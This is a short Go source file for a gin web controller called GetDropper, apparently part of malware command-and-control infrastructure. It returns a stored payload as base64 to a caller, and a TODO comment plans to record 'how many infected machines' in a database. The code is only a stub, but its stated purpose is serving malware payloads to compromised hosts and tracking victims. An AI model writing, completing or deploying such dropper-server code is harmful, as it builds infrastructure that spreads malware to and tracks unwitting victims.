package GetDropper

import (
	"encoding/base64"
	"github.com/gin-gonic/gin"
	"log"
	input "main/src/api/controllers/GetDropper/io"
	"main/src/api/shared/io"
	"net/http"
)

type GetDropperController struct {
	Payload io.Payload
}

func (controller GetDropperController) Get(c *gin.Context) {

	var payload input.DropperInput
	err := c.BindJSON(&payload)

	if err != nil {
		log.Printf("incorrect input format: %v", err)
		return
	}

	// TODO: insert logic here
	// TODO: store in db, how many infected machines

	payloadAsB64 := base64.StdEncoding.EncodeToString(controller.Payload.Bytes)

	response := struct {
		Payload string
	}{
		Payload: payloadAsB64,
	}

	c.IndentedJSON(http.StatusOK, response)
}
